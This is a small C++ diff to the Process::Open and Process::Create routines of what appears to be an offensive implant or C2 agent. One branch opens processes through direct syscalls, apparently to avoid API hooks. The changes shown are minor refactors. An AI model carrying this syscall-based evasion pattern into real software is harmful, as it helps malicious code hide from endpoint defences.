@@ -5,7 +5,7 @@ auto DECLFN Process::Open(
     _In_ BOOL  InheritHandle,
     _In_ ULONG ProcessID
 ) -> HANDLE {
-    HANDLE Handle = INVALID_HANDLE_VALUE;
+    HANDLE Handle = nullptr;
 
     if ( Self->Sys->Enabled ) {
         NTSTATUS          Status   = STATUS_UNSUCCESSFUL;
@@ -13,7 +13,7 @@ auto DECLFN Process::Open(
         CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
 
         SyscallExec( syOpenProc, Status, &Handle, RightsAccess, &ClientID );
-        Self->Ntdll.RtlNtStatusToDosError( Status );
+        Self->Usf->NtStatusToError( Status );
     } else {
         Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
     }
@@ -32,7 +32,7 @@ auto DECLFN Process::Create(
     ULONG  TmpValue     = 0;
     HANDLE PipeWrite    = NULL;
     HANDLE PipeRead     = NULL;
-    PBYTE  PipeBuff     = NULL;
+    BYTE*  PipeBuff     = NULL;
     ULONG  PipeBuffSize = 0;
     UINT8  UpdateCount  = 0;
 
@@ -89,7 +89,7 @@ auto DECLFN Process::Create(
         if ( !Success ) { goto _KH_END; }
 
         if ( PipeBuffSize > 0 ) {
-            PipeBuff = (PBYTE)Self->Hp->Alloc( PipeBuffSize );
+            PipeBuff = (BYTE*)Self->Hp->Alloc( PipeBuffSize );
             if ( !PipeBuff ) { goto _KH_END; }
 
             Success = Self->Krnl32.ReadFile(
